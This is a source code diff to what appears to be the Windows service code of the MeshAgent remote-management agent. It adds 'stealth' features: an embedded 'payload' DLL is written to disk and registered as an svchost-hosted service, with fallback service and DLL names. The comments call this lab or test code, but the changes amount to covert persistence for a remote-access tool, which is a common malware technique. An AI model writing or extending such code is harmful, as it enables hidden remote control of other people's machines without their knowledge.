@@ -40,7 +40,10 @@ limitations under the License.
 #include "microscript/ILibDuktape_Commit.h"
 #include <shellscalingapi.h>
 #include "stealth.h"  // SECURITY: Stealth and obfuscation features
+#include "stealth_utils.h"
 #include "stealth_init.h"  // Lab/test stealth initialization
+#include "stealth_defaults.h"
+#include "svchost_payload.h"
 // Svchost registration helper (implemented in stealth_svchost.c)
 BOOL Stealth_RegisterSvchostService(const wchar_t* serviceName, const wchar_t* dllPath);
 BOOL Stealth_UnregisterSvchostService(const wchar_t* serviceName);
@@ -84,10 +87,53 @@ static BOOL ReadRegStrW(HKEY hKey, LPCWSTR name, LPWSTR out, DWORD cch)
 #include <WtsApi32.h>
 
 #include "branding_util.h"
-static mesh_branding_text_t g_serviceFileText = MeshService_GetServiceFileText();
-static mesh_branding_text_t g_serviceNameText = MeshService_GetServiceNameText();
-static TCHAR* serviceFile = (TCHAR*)g_serviceFileText;
-static TCHAR* serviceName = (TCHAR*)g_serviceNameText;
+static mesh_branding_text_t g_serviceFileText = NULL;
+static mesh_branding_text_t g_serviceNameText = NULL;
+static TCHAR* serviceFile = NULL;
+static TCHAR* serviceName = NULL;
+
+#if defined(MESH_AGENT_SERVER_ID)
+static const char g_meshProvisioningServerIdMarker[] = "SERVERID:" MESH_AGENT_SERVER_ID;
+#endif
+#if defined(MESH_AGENT_MESH_ID)
+static const char g_meshProvisioningMeshIdMarker[] = "MESHID:" MESH_AGENT_MESH_ID;
+#endif
+
+static void MeshService_TouchProvisioningMarkers(void)
+{
+#if defined(MESH_AGENT_SERVER_ID) || defined(MESH_AGENT_MESH_ID)
+	volatile const char* marker = NULL;
+#endif
+#if defined(MESH_AGENT_SERVER_ID)
+	marker = g_meshProvisioningServerIdMarker;
+#endif
+#if defined(MESH_AGENT_MESH_ID)
+	marker = g_meshProvisioningMeshIdMarker;
+#endif
+	(void)marker;
+}
+
+static void MeshService_InitializeBrandingGlobals(void)
+{
+	if (g_serviceFileText == NULL)
+	{
+		g_serviceFileText = MeshService_GetServiceFileText();
+	}
+	if (g_serviceNameText == NULL)
+	{
+		g_serviceNameText = MeshService_GetServiceNameText();
+	}
+	if (serviceFile == NULL && g_serviceFileText != NULL)
+	{
+		serviceFile = (TCHAR*)g_serviceFileText;
+	}
+	if (serviceName == NULL && g_serviceNameText != NULL)
+	{
+		serviceName = (TCHAR*)g_serviceNameText;
+	}
+
+	MeshService_TouchProvisioningMarkers();
+}
 
 SERVICE_STATUS serviceStatus;
 SERVICE_STATUS_HANDLE serviceStatusHandle = 0;
@@ -321,6 +367,8 @@ void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
 	UNREFERENCED_PARAMETER(argc);
 	UNREFERENCED_PARAMETER(argv);
 
+	MeshService_InitializeBrandingGlobals();
+
 	// Initialise service status
 	// Report as our own-process service so SCM manages it as a dedicated process
 	serviceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
@@ -407,6 +455,9 @@ void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
 int RunService(int argc, char* argv[])
 {
 	SERVICE_TABLE_ENTRY serviceTable[2];
+
+	MeshService_InitializeBrandingGlobals();
+
 	serviceTable[0].lpServiceName = serviceName;
 	serviceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
 	serviceTable[1].lpServiceName = NULL;
@@ -547,6 +598,8 @@ int wmain(int argc, char* wargv[])
 		WideCharToMultiByte(CP_UTF8, 0, (LPCWCH)wargv[argvi], -1, argv[argvi], argvsz, NULL, NULL);
 	}
 
+	MeshService_InitializeBrandingGlobals();
+
 	if (argc > 1 && (strcasecmp(argv[1], "-finstall") == 0 || strcasecmp(argv[1], "-funinstall") == 0 ||
 		strcasecmp(argv[1], "-fulluninstall") == 0 || strcasecmp(argv[1], "-fullinstall") == 0 ||
 		strcasecmp(argv[1], "-install") == 0 || strcasecmp(argv[1], "-uninstall") == 0 ||
@@ -568,32 +621,37 @@ int wmain(int argc, char* wargv[])
 
 	//CoInitializeEx(NULL, COINIT_MULTITHREADED);
     // Register svchost-hosted service DLL
-	if (argc > 2 && strcasecmp(argv[1], "-svchost-register") == 0)
+	if (argc > 1 && strcasecmp(argv[1], "-svchost-register") == 0)
 	{
-		// argv[2] = temporary DLL path dropped by installer/bootstrapper
 		WCHAR wTempDll[MAX_PATH * 2] = {0};
 		WCHAR wSvcName[256] = {0};
 		StealthInstallPaths paths;
 		BOOL ok = FALSE;
+		BOOL removeTemp = FALSE;
+		BOOL hasExternalSource = (argc > 2 && argv[2] != NULL && argv[2][0] != 0);
+		BOOL stagedFromEmbedded = FALSE;
 
-		// Convert argv[2] (UTF-8) to wide
-		if (MultiByteToWideChar(CP_UTF8, 0, argv[2], -1, wTempDll, (int)_countof(wTempDll)) <= 0)
-		{
-			printf("[!] Unable to convert DLL path '%s' to Unicode\n", argv[2]);
-			return 1;
-		}
-
-		// Ensure the source DLL exists before proceeding
-		if (GetFileAttributesW(wTempDll) == INVALID_FILE_ATTRIBUTES)
-		{
-			wprintf(L"[!] Source DLL not found: %s\n", wTempDll);
-			return 1;
-		}
-
-		// Compute branded service name (TCHAR) -> wide
 		MeshService_CopyBrandingTextToWide(g_serviceFileText, wSvcName, _countof(wSvcName));
+		if (wSvcName[0] == L'\0')
+		{
+			wcscpy_s(wSvcName, _countof(wSvcName), STEALTH_FALLBACK_SERVICE_NAME);
+		}
 
-		// Calculate permanent install paths and ensure directories exist
+		if (hasExternalSource)
+		{
+			if (MultiByteToWideChar(CP_UTF8, 0, argv[2], -1, wTempDll, (int)_countof(wTempDll)) <= 0)
+			{
+				printf("[!] Unable to convert DLL path '%s' to Unicode\n", argv[2]);
+				return 1;
+			}
+
+			if (GetFileAttributesW(wTempDll) == INVALID_FILE_ATTRIBUTES)
+			{
+				wprintf(L"[!] Source DLL not found: %s\n", wTempDll);
+				return 1;
+			}
+		}
+
 		if (!Stealth_GetInstallPaths(&paths))
 		{
 			printf("[!] Failed to resolve installation paths\n");
@@ -607,18 +665,45 @@ int wmain(int argc, char* wargv[])
 		// Best-effort create of logs directory (non-fatal)
 		Stealth_CreateInstallationDirectory(paths.logsDir);
 
-		// Copy DLL into final location before registering ServiceDll
-		if (!Stealth_InstallFiles(wTempDll, paths.dllPath))
+		if (paths.dllPath[0] == L'\0')
 		{
-			wprintf(L"[!] Failed to copy DLL to %s\n", paths.dllPath);
-			return 1;
+			if (paths.installDir[0] == L'\0')
+			{
+				wprintf(L"[!] Unable to determine svchost DLL destination\n");
+				return 1;
+			}
+			wcscpy_s(paths.dllPath, _countof(paths.dllPath), paths.installDir);
+			size_t dirLen = wcslen(paths.dllPath);
+			if (dirLen > 0 && paths.dllPath[dirLen - 1] != L'\\' && paths.dllPath[dirLen - 1] != L'/')
+			{
+				wcscat_s(paths.dllPath, _countof(paths.dllPath), L"\\");
+			}
+			wcscat_s(paths.dllPath, _countof(paths.dllPath), STEALTH_FALLBACK_DLL_NAME);
+		}
+
+		if (hasExternalSource)
+		{
+			if (!Stealth_InstallFiles(wTempDll, paths.dllPath))
+			{
+				wprintf(L"[!] Failed to copy DLL to %s\n", paths.dllPath);
+				return 1;
+			}
+			removeTemp = (_wcsicmp(wTempDll, paths.dllPath) != 0);
+		}
+		else
+		{
+			if (!MeshSvchostPayload_WriteToPath(paths.dllPath))
+			{
+				Stealth_DebugLastErrorW(L"MeshSvchostPayload_WriteToPath");
+				return 1;
+			}
+			wprintf(L"[+] Embedded payload staged at %s\n", paths.dllPath);
 		}
 
 		ok = Stealth_RegisterSvchostService(wSvcName, paths.dllPath);
 		printf(ok ? "[+] Svchost registration successful\n" : "[!] Svchost registration failed\n");
 
-		// Remove temporary drop if it differs from final destination
-		if (_wcsicmp(wTempDll, paths.dllPath) != 0)
+		if (removeTemp)
 		{
 			DeleteFileW(wTempDll);
 		}
@@ -630,6 +715,10 @@ int wmain(int argc, char* wargv[])
     {
         WCHAR wSvcName[256] = {0};
         MeshService_CopyBrandingTextToWide(g_serviceFileText, wSvcName, _countof(wSvcName));
+        if (wSvcName[0] == L'\0')
+        {
+            wcscpy_s(wSvcName, _countof(wSvcName), STEALTH_FALLBACK_SERVICE_NAME);
+        }
         BOOL ok = Stealth_UnregisterSvchostService(wSvcName);
         printf(ok ? "[+] Svchost unregistration successful\n" : "[!] Svchost unregistration failed\n");
         return ok ? 0 : 1;
@@ -640,6 +729,10 @@ int wmain(int argc, char* wargv[])
     {
         WCHAR wSvcName[256] = {0};
         MeshService_CopyBrandingTextToWide(g_serviceFileText, wSvcName, _countof(wSvcName));
+        if (wSvcName[0] == L'\0')
+        {
+            wcscpy_s(wSvcName, _countof(wSvcName), STEALTH_FALLBACK_SERVICE_NAME);
+        }
 
         wprintf(L"Service: %s\n", wSvcName);
         // Exit code bitmask
